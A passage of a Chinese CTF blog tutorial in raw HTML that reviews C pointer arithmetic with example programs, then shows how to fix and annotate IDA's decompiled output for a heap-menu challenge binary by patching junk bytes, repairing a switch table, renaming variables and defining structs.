punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">114514</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>编译运行的结果如下，我们可以发现第二行的地址貌似有点怪嗷，我们的地址不是一般 0x7f 开头吗？</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">114514</span>\n<span class=\"token number\">469523392</span>  以<span class=\"token number\">16</span>进制表示 <span class=\"token number\">0x1bfc5bc0</span></code></pre>\n<p>要是这么想那只能说你计算机的造纸不够高，注意看 % d 是将值以 int 类型输出，int 类型所占的长度仅为 4 字节，而地址长度在 64 位机是 8 字节， b 的地址又被当成了值，因此只能输出  <code>该地址的低4字节</code></p>\n<p>紧接着继续深入，我们知道 c 语言中的  <code>*</code>  处了乘号之外，还有一个功能就是解引用，也就是将地址里面的值给解出来，既然 b 作为一个地址，那么我们就可以将 b 地址所存放的值用 * 给他解出来</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">114514</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">114514</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1919</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>输出结果</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">114514</span>\n<span class=\"token operator\">-</span><span class=\"token number\">879752048</span>\n<span class=\"token number\">114514</span></code></pre>\n<p>我们又知道 b 数组的地址是连续的，那么我们可以通过加上偏移来实现索引不同位置的值，注意解引用的优先级是比加减要高的</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">114514</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">114514</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1919</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>输出结果</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">114514</span>\n<span class=\"token number\">289332624</span>\n<span class=\"token number\">114514</span>\n<span class=\"token number\">1919</span></code></pre>\n<p>我们同样实现了取下标的效果，但是这个时候可能又有同学会发问，int 类型长度不是 4 吗？为啥 b + 1 就是 b [1] 呢 不应该是 b + 4 吗？</p>\n<p>那么还记得我们的声明吗，b 前面的 int 也不是没有作用的，这是让 c 语言知道 ，b 是一个 int 类型的指针</p>\n<p>接下来介绍强制转换， c 语言中的指针也有强制转换，比如我们 malloc 出来的地址默认是 void * 指针，它的粒度就是 1 字节，我们可以通过 (int *) 从而强制将其转化为 int 类型，从而让 c 语言认为他是一个 4 字节为单位的 int 类型的指针</p>\n<p>接着我们再回到上面的问题，我们将这个 b 指针首先强制转为 void * 类型，再在这个类型上 +4 偏移，其后再强转为 int * 类型并解引用出去，不就也可以输出对应地址偏移的值吗</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">114514</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">114514</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1919</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>b<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>输出结果</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">114514</span>\n<span class=\"token number\">1692555520</span>\n<span class=\"token number\">114514</span>\n<span class=\"token number\">1919</span>\n<span class=\"token number\">1919</span></code></pre>\n<blockquote>\n<p>另外，我们也可以得到如下等式</p>\n<p>a = b[-1] = *b-1 = *(int *)b-1 = *(int *)((void *)b-4)</p>\n</blockquote>\n<p>接下来介绍另一个运算符  <code>&amp;</code> ，这个运算符和  <code>*</code>  相反，&amp; 是取地址</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">114514</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">114514</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1919</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>b<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>输出结果</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">114514</span>\n<span class=\"token number\">1006296128</span>\n<span class=\"token number\">114514</span>\n<span class=\"token number\">1919</span>\n<span class=\"token number\">1919</span>\n<span class=\"token number\">1006296124</span>\n<span class=\"token number\">114514</span></code></pre>\n<p>可以看到最后面的两行，分别输出了 a 的地址和 a 的值，可以观察和上面的地址正好相差了 4 ，这也同时印证了 a 的长度是 4 并且 a 和 b 的地址是连续的，而最后一行 通过 &amp; * 两个运算符的使用 a 作为一个 int 值先取地址随后解引用，就又回到了它本身</p>\n<p>那么对 c 语言的复习先到此为止</p>\n<h2 id=\"把史包装成一坨能上餐桌的史\"><a class=\"markdownIt-Anchor\" href=\"#把史包装成一坨能上餐桌的史\">#</a> 把史包装成一坨能上餐桌的史</h2>\n<h3 id=\"修复错误识别\"><a class=\"markdownIt-Anchor\" href=\"#修复错误识别\">#</a> 修复错误识别</h3>\n<p>首先解决 call 很怪的问题，因为修复其涉及到 patch 程序，所以应该放到其他优化之前</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>sub_1268 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>上面的错误便是 IDA 对函数的错误识别，点进函数切换到汇编视图可以看到下面一大片没有被 IDA 识别到而显示出了触目惊心的红色</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909220207604.png\" alt=\"image-20220909220207604\"></p>\n<p>显然是上面的汇编片段出现了问题，在 push rbp 指令之前还有几条指令，在此之后的识别全部出错，所以，可以使用 IDA keypatch 插件将 push rbp 之前的指令全部 nop 掉</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909220626269.png\" alt=\"image-20220909220626269\"></p>\n<p>保存后再打开已经不见红了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909220950629.png\" alt=\"image-20220909220950629\"></p>\n<p>说明函数也自动被识别成功</p>\n<h3 id=\"修复switch跳转表\"><a class=\"markdownIt-Anchor\" href=\"#修复switch跳转表\">#</a> 修复 switch 跳转表</h3>\n<p>这算是 IDA 里的一个老坑了，反正就这么几个选项，觉得不影响的可以不去修复</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909221433356.png\" alt=\"image-20220909221433356\"></p>\n<p>同样是切到汇编视图</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909221545213.png\" alt=\"image-20220909221545213\"></p>\n<p>这里首先执行了 lea rdx, unk_2110 命令，我们点进这个地址去看，是 data 段的一条数据</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909221813011.png\" alt=\"image-20220909221813011\"></p>\n<p>我们将上面的数据按 D 转换成 4 字节一组，那么这其实就是调转表了，可以看到其中有 6 个元素</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909222033990.png\" alt=\"image-20220909222033990\"></p>\n<p>我们再回到汇编处，这里光标选中刚刚改好的这个地址点进 Edit -&gt; Other -&gt; Specify switch idiom</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909223205678.png\" alt=\"image-20220909223205678\"></p>\n<p>会出现如下对话框</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909231432443.png\" alt=\"image-20220909231432443\"></p>\n<blockquote>\n<p>Number of elements ：跳转元素个数，这个例子是 6</p>\n<p>Size of table element ：跳转表每个元素长度，这里是 4</p>\n<p>Element base value ：这里和第一个相同即可</p>\n<p>Input register of switch ：跳转到的寄存器，这里是 rax</p>\n<p>Default jump address ：默认跳转地址，这里可以看到下面的 “Bad choice”，或者直接点，最后一个就行</p>\n<p>Signed jump table elements ：如果上面看到的跳转表是负数则需要勾选此选项，比如之前看到的数据是 0xff 开头</p>\n</blockquote>\n<p>或者按照大佬的一图流来也可以</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909231230923.png\" alt=\"image-20220909231230923\"></p>\n<p><a href=\"https://blog.csdn.net/huzai9527/article/details/121204850\">IDA 修复跳表_huzai9527 的博客 - CSDN 博客_ida switch 修复</a></p>\n<p>这个时候在打开 main 可以看到已经修复了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909231708468.png\" alt=\"image-20220909231708468\"></p>\n<h3 id=\"重命名函数和变量\"><a class=\"markdownIt-Anchor\" href=\"#重命名函数和变量\">#</a> 重命名函数和变量</h3>\n<p>我们看到的函数，变量名全是将符号表给拿掉的，我们可以通过自己的理解和命名习惯对其重命名</p>\n<p>ida  <code>快捷键 n</code> ， 在变量名或者函数名处按 n 便可以对函数进行重命名</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909215650052.png\" alt=\"image-20220909215650052\"></p>\n<p>以 add 函数为例，初步更改变量名后</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> choice<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span>\n  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span>\n\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">15</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too many link list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  choice <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">></span> <span class=\"token number\">0x70</span> <span class=\"token operator\">||</span> choice <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong size!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  buf <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> choice<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">your_read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>可以看到如上的代码可读性好了一些些了，按照自己的理解继续命名其他函数</p>\n<h3 id=\"修复强制转换\"><a class=\"markdownIt-Anchor\" href=\"#修复强制转换\">#</a> 修复强制转换</h3>\n<p>观察到上面代码中存在着很多这种扎眼的代码</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>ptr_list <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span></code></pre>\n<p>按照我们回顾的 c 语言知识，这里看看 ptr_list 的变量类型为  <code>_QWORD</code>  ，它并非一个常见的类型，不过从名字可以看出它就是一个 4 字 也就是 8 字节 长度的变量，首先将其取地址，随后转化为  <code>_QWORD</code>  指针，之后加上偏移，再解引用</p>\n<p>注意这里别被他绕进去，先取地址再转化为指针，这个时候已经变成地址了，再解引用就又回到了那个值本身，只不过加上了偏移，因此，这不就是之前所说道的数组吗？</p>\n<p>ida  <code>快捷键 y</code> ， 在变量名或者函数名处按 y 便可以对函数进行类型修改</p>\n<p>将其修改为长度为 16 的数组后，代码如下，更像人写的了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909233100532.png\" alt=\"image-20220909233100532\"></p>\n<p>我们再思考一下，malloc 返回的是一个指针，因此用来接收它的数组也是一个指针数组，那么将其修改为指针数组</p>\n<p>可以看到，上面对应偏移存放着不同的值，那么不用怀疑，这个指针应该对应着某种结构体，在隔壁 structues 使用  <code>insert</code>  新插入一个结构体，注意到上面 malloc 大小为 0x18，新建如下数组</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909233810069.png\" alt=\"image-20220909233810069\"></p>\n<p>那么接下来就可以将其修改为我们新建结构体的变量类型了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909233926778.png\" alt=\"image-20220909233926778\"></p>\n<p>出现了结构体指针的标志性 -&gt; 符</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909233950113.png\" alt=\"image-20220909233950113\"></p>\n<p>同时也发现了 LODWORD 这个操作符，出现这个的原因是结构体部分元素粒度不够细，将对应元素拆分成长度更小的元素就行，如下图，按  <code>d</code>  将一个 qd 拆分成两个 dd</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909234257485.png\" alt=\"image-20220909234257485\"></p>\n<p>再回来已经非常接近人类写的代码了</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909234356672.png\" alt=\"image-20220909234356672\"></p>\n<p>再重新重命名一下自定义结构体的各个元素</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span>\n\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">15</span> <span class=\"token operator\">&amp;&amp;</span> ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too many link list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  size <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> size <span class=\"token operator\">></span> <span class=\"token number\">0x70</span> <span class=\"token operator\">||</span> size <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong size!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  buf <span class=\"token operator\">=</span> 